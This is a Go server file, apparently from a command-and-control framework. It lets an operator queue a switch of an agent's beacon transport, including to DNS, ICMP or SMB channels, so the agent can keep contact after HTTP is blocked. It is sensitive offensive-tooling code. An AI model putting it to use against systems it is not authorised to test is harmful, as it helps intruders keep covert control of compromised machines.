package server

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/r0si/sovereign/pkg/protocol"
)

// Explicit transport migration. An operator can ask an agent to switch its
// beacon transport (for example to a TCP listener after HTTP was blocked).
// The command is a one-shot item attached to the next encrypted response;
// the agent keeps its ECDH session, sequence and queued results, so the switch
// is a routing change rather than a re-enrollment.
const (
	transportMigrationTTL  = 5 * time.Minute
	maxTransportMigrations = 10_000
)

var supportedTransportSchemes = map[string]bool{
	"http": true, "https": true, "tcp": true, "tls": true, "udp": true,
	"quic": true, "icmp": true, "ws": true, "wss": true,
	"grpc": true, "grpcs": true, "ssh": true, "mtls": true,
	"h2c": true, "dns": true, "smb": true,
}

// transportURLFamilies maps the agent's transport name to the URL schemes it
// can actually dial. A mismatch would leave the agent configured for a
// transport with no endpoint, so it is refused at request time.
var transportURLFamilies = map[string][]string{
	"http":  {"http", "https"},
	"tcp":   {"tcp", "tls"},
	"ws":    {"ws", "wss"},
	"wss":   {"ws", "wss"},
	"grpc":  {"grpc", "grpcs"},
	"grpcs": {"grpc", "grpcs"},
}

type pendingTransportMigration struct {
	migration protocol.TransportMigration
	at        time.Time
}

var pendingMigrations = struct {
	mu    sync.Mutex
	items map[string]pendingTransportMigration
}{items: make(map[string]pendingTransportMigration)}

// validateTransportMigration is the shared validation gate for the API and
// the tests; it never touches global state.
func validateTransportMigration(transport, rawURL string) (protocol.TransportMigration, error) {
	t := strings.ToLower(strings.TrimSpace(transport))
	if !supportedTransportSchemes[t] {
		return protocol.TransportMigration{}, fmt.Errorf("unsupported transport %q", transport)
	}
	c2URL := strings.TrimSpace(rawURL)
	if c2URL == "" {
		return protocol.TransportMigration{Transport: t}, nil
	}
	parsed, err := url.Parse(c2URL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return protocol.TransportMigration{}, fmt.Errorf("c2_url must be an absolute URL with a host")
	}
	scheme := strings.ToLower(parsed.Scheme)
	if !supportedTransportSchemes[scheme] {
		return protocol.TransportMigration{}, fmt.Errorf("unsupported c2_url scheme %q", scheme)
	}
	families, ok := transportURLFamilies[t]
	if ok {
		allowed := false
		for _, family := range families {
			if family == scheme {
				allowed = true
				break
			}
		}
		if !allowed {
			return protocol.TransportMigration{}, fmt.Errorf("transport %q cannot dial a %s URL", t, scheme)
		}
	} else if scheme != t {
		return protocol.TransportMigration{}, fmt.Errorf("transport %q cannot dial a %s URL", t, scheme)
	}
	return protocol.TransportMigration{Transport: t, C2URL: c2URL}, nil
}

func setPendingTransportMigration(agentID string, transport, c2URL string) error {
	migration, err := validateTransportMigration(transport, c2URL)
	if err != nil {
		return err
	}
	pendingMigrations.mu.Lock()
	defer pendingMigrations.mu.Unlock()
	// Cardinality cap: keys are agent IDs controlled by operators, but the map
	// must still be bounded in a long-lived server.
	if _, ok := pendingMigrations.items[agentID]; !ok && len(pendingMigrations.items) >= maxTransportMigrations {
		oldest := ""
		var at time.Time
		for key, item := range pendingMigrations.items {
			if oldest == "" || item.at.Before(at) {
				oldest, at = key, item.at
			}
		}
		delete(pendingMigrations.items, oldest)
	}
	pendingMigrations.items[agentID] = pendingTransportMigration{migration: migration, at: time.Now()}
	return nil
}

// takePendingTransportMigration consumes a command for one beacon response.
// Expired items are dropped rather than delivered late: a stale switch could
// move a live agent onto an endpoint the operator already abandoned.
func takePendingTransportMigration(agentID string) *protocol.TransportMigration {
	pendingMigrations.mu.Lock()
	defer pendingMigrations.mu.Unlock()
	item, ok := pendingMigrations.items[agentID]
	if !ok {
		return nil
	}
	delete(pendingMigrations.items, agentID)
	if time.Since(item.at) > transportMigrationTTL {
		return nil
	}
	migration := item.migration
	return &migration
}

func gcTransportMigrations() {
	pendingMigrations.mu.Lock()
	defer pendingMigrations.mu.Unlock()
	cutoff := time.Now().Add(-transportMigrationTTL)
	for key, item := range pendingMigrations.items {
		if item.at.Before(cutoff) {
			delete(pendingMigrations.items, key)
		}
	}
}

// handleAgentTransportMigration queues a one-shot transport switch for the
// agent's next encrypted beacon. This is an operator mutation: agents.read is
// not enough, and the handler re-checks tenant visibility of the agent id.
func (s *Server) handleAgentTransportMigration(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	agentID := c.Param("id")
	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}
	var req struct {
		Transport string `json:"transport"`
		C2URL     string `json:"c2_url"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid json: expected transport")
		return
	}
	if err := setPendingTransportMigration(agentID, req.Transport, req.C2URL); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	migration, _ := validateTransportMigration(req.Transport, req.C2URL)
	s.LogAuditRecord(c, "transport_migrate", "agent", agentID,
		fmt.Sprintf("transport migration queued: %s", migration.Transport), true, nil)
	respond(c, gin.H{"queued": true, "transport": migration.Transport, "c2_url": migration.C2URL})
}
